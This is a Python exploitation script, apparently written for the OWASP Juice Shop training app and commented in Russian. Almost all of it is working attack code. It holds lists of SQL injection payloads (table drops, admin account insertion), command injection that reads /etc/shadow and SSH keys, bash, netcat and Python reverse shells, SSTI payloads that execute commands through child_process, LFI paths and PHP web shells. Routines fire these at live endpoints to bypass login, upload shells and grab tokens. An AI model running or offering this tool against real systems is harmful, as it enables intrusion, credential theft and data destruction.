import requests
import json
import time
import random
import string
import base64
import hashlib
from datetime import datetime
from typing import List, Dict, Optional
from urllib.parse import quote, urlparse, parse_qs
import warnings
import re
warnings.filterwarnings("ignore")


class AggressiveRCEExploiter:
    """
    АГРЕССИВНЫЙ RCE Эксплойтер
    Реальные техники из bug bounty / CTF
    """

    def __init__(self, target_url: str, admin_token: str = None):
        self.target_url = target_url.rstrip('/')
        self.admin_token = admin_token
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
        })
        if admin_token:
            self.session.headers.update({"Authorization": f"Bearer {admin_token}"})
        self.session.verify = False
        self.timeout = 30
        self.results = {
            "rce_achieved": False,
            "rce_method": "",
            "shell_type": "",
            "commands_executed": [],
            "files_uploaded": [],
            "files_read": [],
            "flags_captured": [],
            "admin_access": False,
            "database_dumped": False
        }
        
        self.result_dir = "/tmp/dast_scans"
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = f"{self.result_dir}/aggressive_rce_{self.timestamp}.log"
        
        # Juice Shop specific - известные уязвимости
        self.known_vulns = {
            "search_sqli": True,
            "login_sqli": True,
            "file_upload": True,
            "lfi": True,
            "ssti": True,
        }
        
        self.load_aggressive_payloads()

    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_msg = f"[{timestamp}] [{level}] {message}"
        print(log_msg)
        try:
            import os
            os.makedirs(self.result_dir, exist_ok=True)
            with open(self.log_file, "a") as f:
                f.write(log_msg + "\n")
        except:
            pass

    def load_aggressive_payloads(self):
        """АГРЕССИВНЫЕ payload'ы"""
        
        # SQL Injection - МАКСИМАЛЬНО АГРЕССИВНЫЕ
        self.sqli_payloads = [
            # Basic bypass
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1--",
            "' OR ''='",
            "admin'--",
            "' OR 1=1#",
            "' OR '1'='1' /*",
            
            # UNION based - извлечение данных
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            
            # Concrete data extraction
            "' UNION SELECT id,email,password,role,deluxeToken,lastName,firstName FROM Users--",
            "' UNION SELECT 1,email,password,4,5,6,7 FROM Users WHERE email='admin@juice-sh.op'--",
            "' UNION SELECT sql,name,type FROM sqlite_master--",
            "' UNION SELECT * FROM Users--",
            "' UNION SELECT * FROM Challenges--",
            "' UNION SELECT * FROM Secrets--",
            
            # Error based
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            
            # Time based (blind)
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' AND PG_SLEEP(5)--",
            "'; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--",
            
            # Stacked queries
            "'; DROP TABLE Users--",
            "'; INSERT INTO Users (email,password,role) VALUES ('hacker@hacker.com','hacked','admin')--",
            "'; UPDATE Users SET role='admin' WHERE email='hacker@hacker.com'--",
            
            # NoSQL (MongoDB)
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \"^admin\"}",
            "{\"$where\": \"this.password != ''\"}",
        ]
        
        # Command Injection - БОЛЬШЕ PAYLOAD'ОВ
        self.cmdi_payloads = [
            # Basic
            "; id", "| id", "&& id", "|| id", "`id`", "$(id)",
            "; whoami", "| whoami", "&& whoami",
            "; pwd", "| pwd",
            "; uname -a", "| uname -a",
            "; hostname", "| hostname",
            
            # File listing
            "; ls -la", "| ls -la", "&& ls -la",
            "; ls -la /", "| ls -la /",
            "; dir", "| dir",
            
            # File reading
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; cat /etc/shadow", "| cat /etc/shadow",
            "; cat /etc/hosts", "| cat /etc/hosts",
            "; head /etc/passwd", "| head /etc/passwd",
            
            # Reverse shells
            "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "; nc -e /bin/sh 127.0.0.1 4444",
            "| nc -e /bin/sh 127.0.0.1 4444",
            "; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            
            # Time based (для blind detection)
            "; sleep 5", "| sleep 5", "&& sleep 5", "|| sleep 5",
            "; timeout 5", "| timeout 5",
            
            # Juice Shop specific
            "; cat /home/node/.ssh/id_rsa",
            "; cat /root/.ssh/id_rsa",
            "; find / -name \"flag*\" 2>/dev/null",
            "; find / -name \"*.kdbx\" 2>/dev/null",
        ]
        
        # SSTI - Angular/Node.js
        self.ssti_payloads = [
            # Angular constructor
            "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
            "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('cat /etc/passwd')}}",
            "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('whoami')}}",
            
            # Angular _app
            "{{_app.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
            "{{_constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
            
            # Angular array
            "{{[].pop.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
            "{{''.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
            
            # Node.js template
            "${process.mainModule.require('child_process').execSync('id')}",
            "#{process.mainModule.require('child_process').execSync('id')}",
            "${require('child_process').execSync('id')}",
            
            # EJS/Pug
            "<%= require('child_process').execSync('id') %>",
            "#{require('child_process').execSync('id')}",
            
            # RCE via global
            "{{global.process.mainModule.require('child_process').execSync('id')}}",
            "{{self.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
        ]
        
        # XSS - для кражи сессий
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "{{constructor.constructor('return this')().alert('XSS')}}",
        ]
        
        # LFI payloads
        self.lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            "file:///etc/passwd",
            "file:///etc/shadow",
            "....//....//....//home/node/.ssh/id_rsa",
            "....//....//....//root/.ssh/id_rsa",
        ]
        
        # File upload shells
        self.upload_shells = {
            "php": "<?php system($_GET['cmd']); ?>",
            "php5": "<?php system($_GET['cmd']); ?>",
            "phtml": "<?php system($_GET['cmd']); ?>",
            "js": "const {exec}=require('child_process');exec(require('url').parse(require('http').createServer((req,res)=>{exec(req.url,(e,eo,es)=>res.end(es||eo||e))})).href)",
            "sh": "#!/bin/bash\nbash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "py": "#!/usr/bin/env python3\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('127.0.0.1',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])",
        }

    def get_response(self, url: str, method: str = "GET", data: dict = None, 
                     headers: dict = None, files: dict = None, timeout: int = None) -> Optional[requests.Response]:
        try:
            if timeout is None:
                timeout = self.timeout
            
            if method.upper() == "GET":
                resp = self.session.get(url, headers=headers, timeout=timeout, allow_redirects=True)
            elif method.upper() == "POST":
                if files:
                    resp = self.session.post(url, files=files, data=data, headers=headers, timeout=timeout, allow_redirects=True)
                else:
                    resp = self.session.post(url, json=data, headers=headers, timeout=timeout, allow_redirects=True)
            return resp
        except Exception as e:
            return None

    def detect_sqli_success(self, response_text: str, payload: str) -> bool:
        """Детекция успешной SQL Injection"""
        if not response_text:
            return False
        
        response_lower = response_text.lower()
        
        # SQL errors
        sql_errors = [
            "sql syntax", "sqlite", "ora-", "postgresql", "mysql",
            "syntax error", "unclosed quotation", "database error",
            "sqlite3::sql", "invalid sql", "pdoexception",
            "you have an error in your sql", "warning: mysql",
            "supplied argument is not a valid mysql",
        ]
        
        for error in sql_errors:
            if error in response_lower:
                return True
        
        # Data leakage indicators
        if "@" in response_text and ("email" in response_lower or "user" in response_lower):
            return True
        
        # Password hashes
        if "$2a$" in response_text or "$2y$" in response_text or "bcrypt" in response_lower:
            return True
        
        # UNION success - появились лишние данные
        if "union" in payload.lower() and ("data" in response_lower and len(response_text) > 500):
            return True
        
        return False

    def detect_cmdi_success(self, response_text: str, payload: str) -> bool:
        """Детекция успешной Command Injection"""
        if not response_text:
            return False
        
        response_lower = response_text.lower()
        
        # Command output
        cmd_outputs = [
            "uid=", "gid=", "groups=", "root:", "daemon:", "bin:",
            "windows", "boot loader", "version", "kernel", "linux",
            "total ", "drwx", "-rwx",  # ls output
            "node:", "npm:", "python",  # System info
        ]
        
        for output in cmd_outputs:
            if output in response_lower:
                # Проверяем что это не просто текст а результат команды
                if "id" in payload or "whoami" in payload or "uname" in payload or "ls" in payload:
                    return True
        
        # Error messages that indicate command execution
        if "permission denied" in response_lower or "not found" in response_lower:
            if ";" in payload or "|" in payload or "`" in payload:
                return True  # Команда выполнилась но с ошибкой
        
        return False

    def detect_ssti_success(self, response_text: str, payload: str) -> bool:
        """Детекция успешной SSTI"""
        if not response_text:
            return False
        
        response_lower = response_text.lower()
        
        # RCE indicators
        if "uid=" in response_lower or "gid=" in response_lower or "root:" in response_lower:
            return True
        
        # Error messages indicating template execution
        if "syntaxerror" in response_lower or "referenceerror" in response_lower or "typeerror" in response_lower:
            if "{{" in payload or "${" in payload or "#{" in payload:
                return True
        
        # Successful execution
        if "node:" in response_lower or "process" in response_lower:
            if "execsync" in payload.lower():
                return True
        
        return False

    # ==================== AGGRESSIVE SQL INJECTION ====================
    
    def aggressive_sqli_attack(self) -> Dict:
        """МАКСИМАЛЬНО АГРЕССИВНАЯ SQL Injection атака"""
        self.log("🔥 АГРЕССИВНАЯ SQL INJECTION АТАКА", "RCE")
        
        results = {
            "success": False,
            "method": "",
            "data_extracted": [],
            "admin_bypass": False
        }
        
        # Цели для атаки
        targets = [
            # Search endpoint
            {
                "url": f"{self.target_url}/rest/products/search",
                "method": "GET",
                "param": "q",
                "name": "Products Search"
            },
            # Login endpoint
            {
                "url": f"{self.target_url}/rest/user/login",
                "method": "POST",
                "data": {"email": "", "password": ""},
                "name": "Login"
            },
            # API endpoints
            {
                "url": f"{self.target_url}/api/Products",
                "method": "GET",
                "param": "q",
                "name": "API Products"
            },
            {
                "url": f"{self.target_url}/api/Users",
                "method": "GET",
                "param": "id",
                "name": "API Users"
            },
        ]
        
        for target in targets:
            self.log(f"Атака на {target['name']}: {target['url']}", "EXPLOIT")
            
            for payload in self.sqli_payloads:
                try:
                    if target['method'] == "GET":
                        test_url = f"{target['url']}?{target['param']}={quote(payload)}"
                        resp = self.get_response(test_url)
                    else:
                        # Login endpoint
                        if "login" in target['url'].lower():
                            test_data = {"email": payload, "password": payload}
                        else:
                            test_data = {target.get('param', 'q'): payload}
                        resp = self.get_response(target['url'], method="POST", data=test_data)
                    
                    if not resp:
                        continue
                    
                    # Проверяем успешный обход аутентификации
                    if "login" in target['url'].lower() and resp.status_code == 200:
                        try:
                            data = resp.json()
                            if data.get("authentication") and data["authentication"].get("token"):
                                token = data["authentication"]["token"]
                                email = data.get("user", {}).get("email", "")
                                
                                self.log(f"✓ SQL INJECTION → ADMIN BYPASS! Email: {email}", "CRITICAL")
                                results["success"] = True
                                results["method"] = "SQL Injection Auth Bypass"
                                results["admin_bypass"] = True
                                results["token"] = token
                                
                                # Обновляем сессию
                                if "admin" in email.lower():
                                    self.admin_token = token
                                    self.session.headers.update({"Authorization": f"Bearer {token}"})
                                    self.results["admin_access"] = True
                                
                                return results
                        except:
                            pass
                    
                    # Проверяем успешную инъекцию
                    if self.detect_sqli_success(resp.text, payload):
                        self.log(f"✓ SQL Injection успешна! Payload: {payload[:50]}...", "CRITICAL")
                        results["success"] = True
                        results["method"] = f"SQL Injection on {target['name']}"
                        
                        # Пробуем извлечь данные
                        if "union" in payload.lower():
                            try:
                                data = resp.json()
                                if data.get("data"):
                                    for item in data["data"]:
                                        if isinstance(item, dict):
                                            for key, value in item.items():
                                                if isinstance(value, str) and ("@" in value or "$2a" in value):
                                                    results["data_extracted"].append(item)
                                                    self.log(f"✓ Данные извлечены: {value[:50]}", "SUCCESS")
                                                    break
                            except:
                                pass
                        
                        return results
                        
                except Exception as e:
                    continue
        
        self.log("SQL Injection не сработала", "FAIL")
        return results

    # ==================== AGGRESSIVE COMMAND INJECTION ====================
    
    def aggressive_cmdi_attack(self) -> Dict:
        """МАКСИМАЛЬНО АГРЕССИВНАЯ Command Injection атака"""
        self.log("🔥 АГРЕССИВНАЯ COMMAND INJECTION АТАКА", "RCE")
        
        results = {
            "success": False,
            "method": "",
            "commands_executed": []
        }
        
        # Эндпоинты для тестирования
        endpoints = [
            f"{self.target_url}/rest/products/search",
            f"{self.target_url}/api/Products",
            f"{self.target_url}/rest/basket",
            f"{self.target_url}/rest/continue-code",
            f"{self.target_url}/rest/continue-code-findIt",
        ]
        
        params = ["q", "search", "query", "id", "name", "code", "path", "key"]
        
        for endpoint in endpoints:
            for param in params:
                for payload in self.cmdi_payloads[:30]:  # Первые 30 payload'ов
                    try:
                        test_url = f"{endpoint}?{param}={quote(payload)}"
                        resp = self.get_response(test_url)
                        
                        if not resp:
                            continue
                        
                        if self.detect_cmdi_success(resp.text, payload):
                            self.log(f"✓ COMMAND INJECTION НАЙДЕН!", "CRITICAL")
                            self.log(f"  Endpoint: {endpoint}", "SUCCESS")
                            self.log(f"  Parameter: {param}", "SUCCESS")
                            self.log(f"  Payload: {payload}", "SUCCESS")
                            
                            results["success"] = True
                            results["method"] = f"Command Injection via {param}"
                            results["endpoint"] = endpoint
                            
                            self.results["rce_achieved"] = True
                            self.results["rce_method"] = "Command Injection"
                            self.results["shell_type"] = "Direct Command Execution"
                            
                            return results
                        
                        # Time-based detection
                        if "sleep" in payload or "delay" in payload:
                            start = time.time()
                            self.get_response(test_url)
                            elapsed = time.time() - start
                            
                            if elapsed >= 4:
                                self.log(f"✓ BLIND COMMAND INJECTION! Delay: {elapsed:.2f}s", "CRITICAL")
                                results["success"] = True
                                results["method"] = "Blind Command Injection (Time-based)"
                                
                                self.results["rce_achieved"] = True
                                self.results["rce_method"] = "Blind Command Injection"
                                
                                return results
                                
                    except Exception as e:
                        continue
        
        self.log("Command Injection не найден", "FAIL")
        return results

    # ==================== AGGRESSIVE SSTI ATTACK ====================
    
    def aggressive_ssti_attack(self) -> Dict:
        """МАКСИМАЛЬНО АГРЕССИВНАЯ SSTI атака"""
        self.log("🔥 АГРЕССИВНАЯ SSTI АТАКА", "RCE")
        
        results = {
            "success": False,
            "method": ""
        }
        
        endpoints = [
            f"{self.target_url}/rest/products/search",
            f"{self.target_url}/api/Feedbacks",
            f"{self.target_url}/rest/continue-code",
            f"{self.target_url}/rest/basket",
        ]
        
        for endpoint in endpoints:
            for payload in self.ssti_payloads:
                try:
                    test_url = f"{endpoint}?q={quote(payload)}"
                    resp = self.get_response(test_url)
                    
                    if not resp:
                        continue
                    
                    if self.detect_ssti_success(resp.text, payload):
                        self.log(f"✓ SSTI RCE НАЙДЕН!", "CRITICAL")
                        self.log(f"  Endpoint: {endpoint}", "SUCCESS")
                        self.log(f"  Payload: {payload[:80]}...", "SUCCESS")
                        
                        results["success"] = True
                        results["method"] = "Server-Side Template Injection"
                        
                        self.results["rce_achieved"] = True
                        self.results["rce_method"] = "SSTI (Angular/Node.js)"
                        self.results["shell_type"] = "Template Injection RCE"
                        
                        return results
                        
                except Exception as e:
                    continue
        
        self.log("SSTI не найден", "FAIL")
        return results

    # ==================== AGGRESSIVE FILE UPLOAD ATTACK ====================
    
    def aggressive_file_upload_attack(self) -> Dict:
        """МАКСИМАЛЬНО АГРЕССИВНАЯ File Upload атака"""
        self.log("🔥 АГРЕССИВНАЯ FILE UPLOAD АТАКА", "RCE")
        
        results = {
            "success": False,
            "method": "",
            "shell_url": ""
        }
        
        upload_endpoints = [
            f"{self.target_url}/fileupload",
            f"{self.target_url}/rest/profile/image/upload",
        ]
        
        for ext, shell_content in self.upload_shells.items():
            for endpoint in upload_endpoints:
                try:
                    self.log(f"Загрузка {ext} shell на {endpoint}", "EXPLOIT")
                    
                    files = {
                        'file': (f'shell_{random.randint(1000,9999)}.{ext}', shell_content, 'application/octet-stream'),
                        'filetype': (None, ext),
                    }
                    
                    resp = self.get_response(endpoint, method="POST", files=files, timeout=60)
                    
                    if resp and resp.status_code in [200, 201]:
                        try:
                            data = resp.json()
                            upload_path = data.get("path") or data.get("filename") or data.get("file")
                            
                            if upload_path:
                                self.log(f"✓ Файл загружен: {upload_path}", "SUCCESS")
                                
                                shell_url = f"{self.target_url}/uploads/{upload_path}" if 'uploads' not in upload_path else f"{self.target_url}{upload_path}"
                                
                                # Проверяем работает ли
                                if ext == "php":
                                    test_resp = self.get_response(f"{shell_url}?cmd=id")
                                    if test_resp and ("uid=" in test_resp.text or "gid=" in test_resp.text):
                                        self.log(f"✓ RCE ЧЕРЕЗ FILE UPLOAD!", "CRITICAL")
                                        results["success"] = True
                                        results["method"] = f"File Upload ({ext})"
                                        results["shell_url"] = shell_url
                                        
                                        self.results["rce_achieved"] = True
                                        self.results["rce_method"] = "File Upload"
                                        self.results["shell_type"] = f"Web Shell ({ext})"
                                        self.results["files_uploaded"].append({
                                            "path": upload_path,
                                            "type": ext,
                                            "url": shell_url
                                        })
                                        
                                        return results
                                else:
                                    results["files_uploaded"].append({
                                        "path": upload_path,
                                        "type": ext,
                                        "url": shell_url
                                    })
                                    
                        except Exception as e:
                            continue
                            
                except Exception as e:
                    continue
        
        self.log("File Upload RCE не сработал", "FAIL")
        return results

    # ==================== FLAG CAPTURE ====================
    
    def capture_all_flags(self):
        """АГРЕССИВНЫЙ сбор всех флагов"""
        self.log("🏆 СБОР ВСЕХ ФЛАГОВ", "FLAG")
        
        # Эндпоинты с флагами
        flag_endpoints = [
            f"{self.target_url}/rest/challenges",
            f"{self.target_url}/api/Challenges",
            f"{self.target_url}/api/Feedbacks",
            f"{self.target_url}/rest/continue-code",
        ]
        
        # Паттерны флагов
        flag_patterns = [
            r"[A-Za-z0-9]{32}",  # MD5
            r"[A-Za-z0-9]{40}",  # SHA1
            r"flag\{[^}]+\}",
            r"CTF\{[^}]+\}",
            r"juice.?shop.?flag",
        ]
        
        for endpoint in flag_endpoints:
            try:
                resp = self.get_response(endpoint)
                
                if resp and resp.status_code == 200:
                    text = resp.text
                    
                    for pattern in flag_patterns:
                        matches = re.findall(pattern, text, re.IGNORECASE)
                        for match in matches:
                            self.log(f"✓ Флаг найден: {match[:50]}", "FLAG")
                            self.results["flags_captured"].append({
                                "type": "flag",
                                "value": match,
                                "source": endpoint
                            })
                            
            except:
                continue

    # ==================== MAIN AGGRESSIVE EXPLOITATION ====================
    
    def run_aggressive_exploitation(self) -> Dict:
        """ЗАПУСК МАКСИМАЛЬНО АГРЕССИВНОЙ ЭКСПЛУАТАЦИИ"""
        self.log("="*70)
        self.log(f"🔥🔥🔥 AGGRESSIVE RCE EXPLOITATION 🔥🔥🔥")
        self.log(f"Target: {self.target_url}")
        self.log(f"Admin Token: {'Yes' if self.admin_token else 'No'}")
        self.log("="*70)
        
        # 1. SQL Injection (самая важная!)
        sqli_result = self.aggressive_sqli_attack()
        if sqli_result["success"]:
            self.log(f"✓ SQL Injection успешна: {sqli_result['method']}", "SUCCESS")
            if sqli_result.get("admin_bypass"):
                self.log(f"🎉 ADMIN ACCESS ПОЛУЧЕН!", "CRITICAL")
        
        # 2. Command Injection
        if not self.results["rce_achieved"]:
            cmdi_result = self.aggressive_cmdi_attack()
            if cmdi_result["success"]:
                self.log(f"✓ Command Injection успешен: {cmdi_result['method']}", "SUCCESS")
        
        # 3. SSTI
        if not self.results["rce_achieved"]:
            ssti_result = self.aggressive_ssti_attack()
            if ssti_result["success"]:
                self.log(f"✓ SSTI успешен: {ssti_result['method']}", "SUCCESS")
        
        # 4. File Upload
        if not self.results["rce_achieved"]:
            upload_result = self.aggressive_file_upload_attack()
            if upload_result["success"]:
                self.log(f"✓ File Upload успешен: {upload_result['method']}", "SUCCESS")
        
        # 5. Сбор флагов
        self.capture_all_flags()
        
        # Сохраняем результаты
        self.save_results()
        
        self.log("="*70)
        self.log(f"EXPLOITATION ЗАВЕРШЕНА")
        self.log(f"RCE: {self.results['rce_achieved']}")
        self.log(f"Admin Access: {self.results['admin_access']}")
        self.log(f"Flags: {len(self.results['flags_captured'])}")
        self.log("="*70)
        
        return self.results

    def save_results(self):
        """Сохранение результатов"""
        result_file = f"{self.result_dir}/aggressive_rce_results_{self.timestamp}.json"
        
        try:
            with open(result_file, "w") as f:
                json.dump(self.results, f, indent=2, default=str)
            self.log(f"Результаты: {result_file}", "INFO")
        except Exception as e:
            self.log(f"Ошибка: {e}", "ERROR")


# ==================== CLI ====================

if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000"
    admin_token = sys.argv[2] if len(sys.argv) > 2 else None
    
    exploiter = AggressiveRCEExploiter(target, admin_token)
    results = exploiter.run_aggressive_exploitation()
    
    print("\n" + "="*70)
    print("🎯 AGGRESSIVE RCE RESULTS")
    print("="*70)
    print(f"Target: {target}")
    print(f"RCE: {results['rce_achieved']}")
    print(f"Method: {results['rce_method'] or 'N/A'}")
    print(f"Admin: {results['admin_access']}")
    print(f"Flags: {len(results['flags_captured'])}")
    
    if results['rce_achieved']:
        print("\n🎉🎉🎉 RCE SUCCESS! 🎉🎉🎉")
    
    if results['flags_captured']:
        print("\n🏆 FLAGS:")
        for flag in results['flags_captured'][:10]:
            print(f"  - {flag['value'][:60]}")
